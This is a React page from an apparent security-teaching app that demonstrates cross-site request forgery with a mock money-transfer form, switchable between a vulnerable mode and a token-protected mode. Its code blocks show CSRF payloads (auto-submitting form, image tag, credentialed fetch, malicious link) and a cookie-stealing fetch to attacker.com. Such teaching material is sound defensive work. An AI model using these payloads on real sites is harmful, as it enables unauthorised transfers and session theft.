import React, { useState, useEffect } from 'react';
import { useSecurityMode } from '../contexts/SecurityModeContext';
import DemoCard from '../components/common/DemoCard';
import Input from '../components/common/Input';
import Button from '../components/common/Button';
import CodeBlock from '../components/common/CodeBlock';
import Alert from '../components/common/Alert';
import InfoPanel from '../components/common/InfoPanel';
import Badge from '../components/common/Badge';
import { csrfAPI } from '../services/api';

const CSRF = () => {
  const { mode, isSecure } = useSecurityMode();
  const [formData, setFormData] = useState({ to: '', amount: '' });
  const [csrfToken, setCsrfToken] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState('form');
  const [sessionInfo, setSessionInfo] = useState(null);
  const [profileInfo, setProfileInfo] = useState(null);

  useEffect(() => {
    loadForm();
  }, [mode]);

  const loadForm = async () => {
    try {
      const response = await csrfAPI.getForm(mode);
      if (response.data.csrfToken) {
        setCsrfToken(response.data.csrfToken);
      }
    } catch (error) {
      console.error('Failed to load form:', error);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setResult(null);

    try {
      const payload = isSecure
        ? { ...formData, csrf_token: csrfToken }
        : formData;

      const response = await csrfAPI.transfer(payload, mode);
      setResult({ success: true, data: response.data });
      setFormData({ to: '', amount: '' });
      await loadForm();
    } catch (error) {
      setResult({
        success: false,
        error: error.response?.data?.error || 'Transfer failed',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleGetSessionInfo = async () => {
    try {
      const response = await csrfAPI.getSessionInfo(mode);
      setSessionInfo(response.data);
    } catch (error) {
      console.error('Failed to get session info:', error);
    }
  };

  const handleGetProfile = async () => {
    try {
      const response = await csrfAPI.getProfile(mode);
      setProfileInfo(response.data);
    } catch (error) {
      console.error('Failed to get profile:', error);
    }
  };

  const openAttackSite = () => {
    // Open the external CSRF attack site
    // The attack site should be served on port 8081
    const attackSiteUrl = 'http://localhost:8081/csrf-attack.html';
    window.open(attackSiteUrl, '_blank', 'width=800,height=600');
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold text-gray-900 mb-2">
          Cross-Site Request Forgery (CSRF) Demo
        </h1>
        <p className="text-gray-600">
          Learn how CSRF attacks trick users into performing unwanted actions and how to prevent them.
        </p>
      </div>

      {/* Mode Alert */}
      <Alert
        type={isSecure ? 'success' : 'warning'}
        title={isSecure ? 'Secure Mode: CSRF Token Protection' : 'Insecure Mode: No CSRF Protection'}
      >
        {isSecure
          ? 'This implementation uses CSRF tokens to verify that requests originate from the legitimate site.'
          : 'This implementation has no CSRF protection, making it vulnerable to cross-site request forgery attacks.'}
      </Alert>

      {/* Explanation Panel */}
      <InfoPanel title="What is Cross-Site Request Forgery (CSRF)?" defaultOpen>
        <p className="mb-3">
          CSRF is an attack that forces authenticated users to execute unwanted actions on a web
          application. The attack exploits the trust that a site has in a user's browser.
        </p>
        <ol className="list-decimal list-inside space-y-1 mb-3">
          <li>User is logged into a vulnerable site</li>
          <li>User visits a malicious site (or clicks a malicious link)</li>
          <li>Malicious site sends a request to the vulnerable site</li>
          <li>Browser automatically attaches cookies/session</li>
          <li>Action executes without user intent or knowledge</li>
        </ol>
        <p className="mb-2">
          <strong>Common CSRF Attack Methods:</strong>
        </p>
        <ul className="list-disc list-inside space-y-1">
          <li><strong>Form Auto-Submit:</strong> Hidden form that submits automatically</li>
          <li><strong>Image Tag:</strong> Using &lt;img&gt; tag to trigger GET requests</li>
          <li><strong>AJAX Request:</strong> JavaScript fetch/XMLHttpRequest from malicious site</li>
          <li><strong>Session Stealing:</strong> Stealing session ID via XSS then using it</li>
        </ul>
      </InfoPanel>
      
      {/* Attack Type Tabs */}
      <div className="border-b border-gray-200">
        <nav className="-mb-px flex space-x-8">
          {['form', 'attacks', 'session-stealing'].map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`py-4 px-1 border-b-2 font-medium text-sm ${
                activeTab === tab
                  ? 'border-blue-500 text-blue-600'
                  : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
              }`}
            >
              {tab.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ')}
            </button>
          ))}
        </nav>
      </div>

      {/* Transfer Form Tab */}
      {activeTab === 'form' && (
        <>
          <DemoCard title="Money Transfer Form" badge={isSecure ? 'Secure' : 'Vulnerable'}>
            {isSecure && csrfToken && (
              <Alert type="info" title="CSRF Token">
                <div className="flex justify-between items-center">
                  <code>{csrfToken}</code>
                  <Badge variant="secure">Protected</Badge>
                </div>
              </Alert>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              <Input
                label="Recipient Account"
                value={formData.to}
                onChange={(e) => setFormData({ ...formData, to: e.target.value })}
                required
              />
              <Input
                label="Amount"
                type="number"
                value={formData.amount}
                onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                required
              />

              {isSecure && <input type="hidden" value={csrfToken} />}

              <Button type="submit" disabled={loading}>
                {loading ? 'Processing...' : 'Transfer Money'}
              </Button>
            </form>

            {result && (
              <Alert type={result.success ? 'success' : 'error'}>
                {result.success ? JSON.stringify(result.data, null, 2) : result.error}
              </Alert>
            )}
          </DemoCard>
        </>
      )}

      {/* Attack Methods Tab */}
      {activeTab === 'attacks' && (
        <>
          <DemoCard title="CSRF Attack Methods" badge="Attack Types">
            <div className="space-y-6">
              <div>
                <h4 className="font-semibold mb-2">1. Form Auto-Submit Attack</h4>
                <p className="text-gray-700 mb-2">
                  A malicious site creates a hidden form and auto-submits it when the page loads.
                </p>
                <CodeBlock
                  code={`<!-- Malicious site code -->
<form id="csrf-form" action="http://localhost:5000/api/attack/csrf/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>`}
                  language="html"
                />
              </div>

              <div>
                <h4 className="font-semibold mb-2">2. Image Tag Attack (GET Request)</h4>
                <p className="text-gray-700 mb-2">
                  Using an &lt;img&gt; tag to trigger a GET request. Works if the endpoint accepts GET.
                </p>
                <CodeBlock
                  code={`<!-- Malicious site code -->
<img src="http://localhost:5000/api/attack/csrf/transfer?to=attacker&amount=10000" width="0" height="0">`}
                  language="html"
                />
              </div>

              <div>
                <h4 className="font-semibold mb-2">3. AJAX/Fetch Attack</h4>
                <p className="text-gray-700 mb-2">
                  Using JavaScript fetch() to send a POST request from malicious site.
                </p>
                <CodeBlock
                  code={`// Malicious site JavaScript
fetch('http://localhost:5000/api/attack/csrf/transfer', {
  method: 'POST',
  credentials: 'include', // Include cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});`}
                  language="javascript"
                />
              </div>

              <div>
                <h4 className="font-semibold mb-2">4. Link-Based Attack</h4>
                <p className="text-gray-700 mb-2">
                  Tricking user to click a link that performs an action.
                </p>
                <CodeBlock
                  code={`<!-- Malicious link -->
<a href="http://localhost:5000/api/attack/csrf/transfer?to=attacker&amount=10000">
  Click here for free money!
</a>`}
                  language="html"
                />
              </div>
            </div>
          </DemoCard>

          {/* Live Attack Simulation */}
          <DemoCard title="Live Attack Simulation" badge="External Site">
            <div className="space-y-4">
              <p className="text-gray-700">
                Click below to open a malicious external website that will attempt to:
              </p>
              <ul className="list-disc list-inside space-y-1 text-gray-700 mb-4">
                <li>Steal your session ID and cookies</li>
                <li>Perform unauthorized money transfers</li>
                <li>Access your profile information</li>
                <li>Demonstrate how CSRF attacks work in real-time</li>
              </ul>

              <Button
                variant="danger"
                onClick={openAttackSite}
              >
                🚨 Open Malicious CSRF Attack Site
              </Button>

              <Alert type="warning" title="Important">
                Make sure you're in <strong>Insecure Mode</strong> to see the attack succeed.
                In Secure Mode, the attack will be blocked by CSRF token validation.
              </Alert>
            </div>
          </DemoCard>
        </>
      )}

      {/* Session Stealing Tab */}
      {activeTab === 'session-stealing' && (
        <>
          <DemoCard title="Session Information" badge={isSecure ? 'Secure' : 'Vulnerable'}>
            <div className="space-y-4">
              <p className="text-gray-700">
                CSRF attacks often combine with session stealing. An attacker can steal your session ID
                and use it to perform actions on your behalf.
              </p>
              
              <div className="flex gap-2">
                <Button onClick={handleGetSessionInfo}>
                  Get Session Information
                </Button>
                <Button onClick={handleGetProfile}>
                  Get Profile Information
                </Button>
              </div>

              {sessionInfo && (
                <div className="mt-4">
                  <h4 className="font-semibold mb-2">Session Data:</h4>
                  <CodeBlock
                    code={JSON.stringify(sessionInfo, null, 2)}
                    language="json"
                  />
                  {!isSecure && (
                    <Alert type="danger" className="mt-2">
                      ⚠️ This session information can be stolen by a malicious site! The attacker
                      can use your session ID to make requests on your behalf.
                    </Alert>
                  )}
                </div>
              )}

              {profileInfo && (
                <div className="mt-4">
                  <h4 className="font-semibold mb-2">Profile Data:</h4>
                  <CodeBlock
                    code={JSON.stringify(profileInfo, null, 2)}
                    language="json"
                  />
                </div>
              )}

              <div className="mt-4">
                <h4 className="font-semibold mb-2">How Session Stealing Works:</h4>
                <CodeBlock
                  code={`// Step 1: Attacker steals session via XSS or other method
<script>
  // Steal session ID
  fetch('http://attacker.com/steal?session=' + document.cookie);
</script>

// Step 2: Attacker uses stolen session to perform CSRF
fetch('http://vulnerable-site.com/api/attack/csrf/transfer', {
  method: 'POST',
  credentials: 'include', // Uses stolen cookies
  headers: { 'Cookie': 'JSESSIONID=stolen_session_id' },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});`}
                  language="javascript"
                />
              </div>
            </div>
          </DemoCard>
        </>
      )}

      {/* Code Comparison */}
      <DemoCard title="Code Comparison" badge="Implementation">
        <CodeBlock
          language="javascript"
          code={`// Insecure
POST /transfer
(no CSRF validation)

// Secure
POST /transfer
(validate CSRF token)`}
        />
      </DemoCard>
    </div>
  );
};

export default CSRF;
